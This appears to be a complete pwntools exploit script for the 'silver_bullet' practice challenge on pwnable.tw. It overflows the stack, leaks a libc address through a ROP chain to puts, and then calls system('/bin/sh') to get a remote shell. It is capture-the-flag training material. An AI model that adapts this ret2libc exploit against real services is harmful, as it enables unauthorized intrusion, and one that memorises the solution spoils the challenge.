#!/usr/bin/env python3

from pwn import *

r = None
libc = None
exe = None
ld = ELF("./ld-2.23.so")

debug = False

def conn():
    global r, libc, exe
    if debug:
        r = process("./silver_bullet_patched")
        libc = ELF("./libc-2.23.so")
        exe = ELF("./silver_bullet_patched")
    else:
        r = remote("chall.pwnable.tw", 10103)
        libc = ELF("./libc_32.so.6")
        exe = ELF("./silver_bullet")
    context.binary = exe
    return r

conn()

log.info(f"[PUTS PLT] {hex(exe.plt['puts'])}")
log.info(f"[PUTS GOT] {hex(exe.got['puts'])}")
log.info(f"[LIBC PUTS OFFSET] {hex(libc.symbols['puts'])}")


ropchain = flat(
            exe.plt["puts"],
            exe.symbols["main"],    
            exe.got["puts"],
        )

# corrupt stack
r.sendafter(b"Your choice :", b"1")
r.sendafter(b":", b"\xff"*47)

r.sendafter(b":", b"2")
r.sendafter(b":", b"\xff")

# overwrite saved rip with ropchain
r.sendafter(b":", b"2")
r.sendafter(b":", b"\xff"*7 + ropchain)
r.recvuntil(b"it")
r.recvuntil(b"!")

r.sendafter(b"Your choice :", b"3")
r.recvuntil(b"!!\n")

# leak libc.puts() and calculate libc base
libc.address = int.from_bytes(r.recv(4), "little") - libc.symbols["puts"]
log.info(f"[LIBC ADDRESS] {hex(libc.address)}")

# build new ropchain to system("/bin/sh")
rop = ROP(libc)
ropchain = flat(
            libc.symbols["system"],
            next(libc.search(b"/bin/sh\x00")),
            next(libc.search(b"/bin/sh\x00")),
            next(libc.search(b"/bin/sh\x00")),
            next(libc.search(b"/bin/sh\x00")),
        )

# new stack corruption
r.sendafter(b"Your choice :", b"1")
r.sendafter(b":", b"\xff"*47)

r.sendafter(b"Your choice :", b"2")
r.sendafter(b":", b"\xff")

# overwrite saved rip with ropchain
r.sendafter(b"Your choice :", b"2")
r.sendafter(b":", b"\xff"*7 + ropchain)

r.sendafter(b"Your choice :", b"3")
r.recvuntil(b"You win !!\n")

r.interactive()
